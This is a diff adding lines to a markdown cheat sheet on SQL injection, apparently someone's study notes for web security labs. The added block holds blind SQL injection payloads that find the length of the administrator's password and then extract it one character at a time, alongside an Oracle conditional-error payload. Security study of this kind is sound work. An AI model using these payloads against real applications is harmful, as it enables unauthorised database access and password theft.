@@ -28,6 +28,17 @@
 # Columns must support the result type (e.g.. string column can only hold a string value)
 ```
 ### Blind SQL
+
+```
+# Identify password length
+'AND (SELECT 'a' from users WHERE username='administrator' AND LENGTH(password)>1)='a
+
+# Identify one password character at a time
+'AND (SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='administrator'),§1§,1)))=§97§--
+# For each substring character (1,1; then 2,1; 3,1; etc...) cycle through all the decimal values for printable characters (33-126)
+
+# for oracle, use SUBSTR instead of SUBSTRING
+```
 ```
 #Oracle  
 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual  
